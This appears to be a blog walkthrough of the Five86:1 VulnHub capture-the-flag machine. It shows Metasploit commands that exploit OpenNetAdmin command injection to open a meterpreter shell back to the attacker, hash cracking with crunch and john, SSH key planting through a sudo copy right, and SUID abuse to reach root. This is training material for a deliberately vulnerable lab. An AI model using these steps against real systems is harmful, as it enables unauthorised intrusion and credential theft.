<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Five86:1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/five861-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-01-22T06:24:13+00:00">January 22, 2020</time><time class="updated" datetime="2025-06-10T20:10:46+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are sharing another CTF walkthrough of the vulnhub machine named Five86-1 with the intent of gaining experience in the world of penetration testing. The credit goes to m0tl3ycr3w for design this machine and the level is set to beginner to advanced.</span></p>
<p><span style="color: #000000;"><em>According to the author: The ultimate goal of this challenge is to get root and to read the one and only flag.</em></span></p>
<p><span style="color: #000000;"><em>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</em></span></p>
<p><span style="color: #000000;">Download it from here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/five86-1,417/">https://www.vulnhub.com/entry/five86-1,417/</a></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies</strong></span></h3>
<p><strong><span style="color: #000000;">Network scanning</span></strong></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><strong><span style="color: #000000;">Enumeration</span></strong></p>
<ul>
<li><span style="color: #000000;">Exploring Http services</span></li>
</ul>
<p><strong><span style="color: #000000;">Exploit OpenNetAdmin</span></strong></p>
<ul>
<li><span style="color: #000000;">Command Injection (Metasploit)</span></li>
<li><span style="color: #000000;">Crack the hashes (john)</span></li>
</ul>
<p><strong><span style="color: #000000;">Privilege Escalation</span></strong></p>
<ul>
<li><span style="color: #000000;">Abusing Sudo</span></li>
<li><span style="color: #000000;">Abusing SUID</span></li>
</ul>
<h3><span style="color: #800000;"><strong><u>Walkthrough</u></strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
<p><span style="color: #000000;">As you know, this is the initial phase where we used netdiscover for network scan for identifying host IP and this we have 192.168.0.126 as our host IP.</span></p>
<p> </p>
<p><span style="color: #000000;">In our next step, we love to use nmap for network ports enumeration, thus we run the following command and found port 80 is open for HTTP, moreover, we also found robots.txt displaying disallow entry for /ona as shown in the below image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Aipgwa6dyEQ/XifoGZlmVhI/AAAAAAAAiRI/77RhhoZPBGoO2eq_CawwjhiaIYaN58F9ACLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Thus, we navigate to a web browser and browse the following URL and found open network admin application is running on the webserver and disclosing application installed version.</span></p>
<pre class="lang:default decode:true">http://192.168.0.126/ona</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jm0S0sRdPrY/XifoGhack5I/AAAAAAAAiRM/KKT0zxnf_0McJfgzYqGI04ikW3puPfe4gCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">As we notice that the openNetAdmin 18.1.1 version is installed on the host machine, so we explored for its exploit and found ruby script for Metasploit available to <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://exploit-db.com/exploits/47772">Exploit DB</a></span> to abuse OpenNetAdmin against command injection. Without wasting time, we download a malicious file from our local machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-53KayIS9pZM/XifoHK8DoyI/AAAAAAAAiRQ/8a_WsiORircJDGnGYnj5KtOIGF4peQPgQCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Further, we copied the download ruby inside the Metasploit framework to use the module for exploit the host machine against its vulnerability.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nW7bCdXV50M/XifoHRb-3EI/AAAAAAAAiRU/41fEkI7fsL0mfByGe8hW6jwfDji08zZ1gCLcBGAsYHQ/s1600/5.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploit </strong></span></h3>
<p><span style="color: #000000;">After copying the exploit inside Metasploit Framework, you will need to reload the database and load the module.</span></p>
<p><span style="color: #000000;">Here we got our meterpreter session after running the following commands:</span></p>
<pre class="lang:default decode:true">use exploit 47772
set rhosts 192.168.0.126
set lhost 192.168.0.132
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l_pTHpIb7-M/XifoHkYNGHI/AAAAAAAAiRY/C2g98EXtXfo1IgxVS48tILyKIxsHOo2DQCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">So, we successfully exploited the host machine and spawned the shell as www-data, we decided to go with post enumeration for privilege escalation and as a result, we found the “.htaccess” file from within <em>/var/www/html/reports</em>. By reading the .htaccess we found path for .htpasswd file i.e. “/var/www/.htpasswd” , and by reading .htapasswd file we found hashes for user “douglas”. In the .htapsswd file, the author has left a hint for the password as shown in the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cGr9bfryi9o/XifoHx4Eg5I/AAAAAAAAiRc/2W2LWGGj-IgTeZMdkBmRcEq2wvnpnmXSwCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">So, we found that the password is a 10-character “aefhrt” string, so you’ll need to prepare a 10-character long password dictionary. Here we use crunch to create the dictionary and execute the following command to follow the pattern of the password as the author has said.</span></p>
<pre class="lang:default decode:true">crunch 10 10 aefhrt &gt; dict.txt</pre>
<p><span style="color: #000000;">With the help of the above command, we generated a dictionary and used the john ripper to crack the hash value. Here I saved the hash value described above in a text file called “hash” and used dict.txt wordlist to crack the hash value and run the following command.</span></p>
<pre class="lang:default decode:true">john --wordlist=/root/dict.txt hash</pre>
<p><span style="color: #000000;">As a result, we found the password: “<strong>fatherrrrr</strong>” for the given hash value.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jOvvMFLe5LQ/XifoIJHz3SI/AAAAAAAAiRg/gVFbpDmpM0IZX9lhg6rYSQ1eNHc8L_KuACLcBGAsYHQ/s1600/8.1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">As we spawned the host machine shell, we try to switch as Douglas by using the password cracked above. When we signed in as Douglass, we searched for the sudo rights for him and found that he could use the copy program as “jen.”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AOiBQPOxbDg/XifoIGD4MbI/AAAAAAAAiRk/Qa98peVsKOcz9Dc84OROqnt0I7ZwzjpbACLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Since the author has given sudo right on copy program which could be executed as jen hence we can copy the ssh public rsa_key of douglas inside /home/jen/.ssh so that we can be logged as jen. Thus, we executed the following commands as given below.</span></p>
<pre class="lang:default decode:true">cat id_rsa.pub &gt; /tmp/authorized_keys
cd /tmp
chmod 777 authorized_keys
sudo -u jen /bin/cp authorized_keys /home/jen/.ssh</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-OfGdHQ5Dz2g/XifoFcQ-sTI/AAAAAAAAiQ4/JtziB2ztR04OmkBimb2DSLNiPveYDj5wACLcBGAsYHQ/s1600/10.png"/></strong></span></p>
<p><span style="color: #000000;">Now copy id_rsa in the /tmp directory and change the permission then try to access ssh shell on localhost as jen.</span></p>
<pre class="lang:default decode:true">cd .ssh
cp id_rsa /tmp
cd /tmp
chmod 600 id_rsa
ssh -i id_rsa jen@127.0.0.1</pre>
<p><span style="color: #000000;">Hmmm! As we connected to the ssh shell as jen we found another hint “<em>you have a new mail</em>” on the ssh banner as shown in the given image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WWitVzpb2Sg/XifoFUOWI4I/AAAAAAAAiQ8/mscpEYwleGY6njMR3e8ZcS80NWOiA7rRQCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">So, we find a text file “jen” in / var/mails that shows a jen email. As per this message, jen knows the password for the Moss account, so we can use the Moss credential for a further move.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VqkQdJfOguY/XifoF4W2pAI/AAAAAAAAiRA/RBHGajq3HzIeAr7Gi9URdwJHX15pTTJ0wCLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">So, switched from Jen’s account to Moss and identified for SUID enabled directories, luckily here we found that the sticky bit is enabled for “upyourgame” as shown in the image.</span></p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null
cd .game
./upyourgame</pre>
<p><span style="color: #000000;">So we navigate to /home/Moss/.game/ and run the “upyourgame” program, the program launches questionnaires that are only answerable in the YES / NO format, and finally, we get the root shell and find the final flag in the /root directory as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Rd-K3ytxL0U/XifoGcnBbJI/AAAAAAAAiRE/jTPLI1La4uUz-bZV_khGZjJp-PuGFKgrQCLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Shubham Sharma is a Pentester, Cybersecurity Researcher and Enthusiast, contact <a style="color: #000000;" href="https://www.linkedin.com/in/shubham-sharma-626964153/"><strong>here</strong></a>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
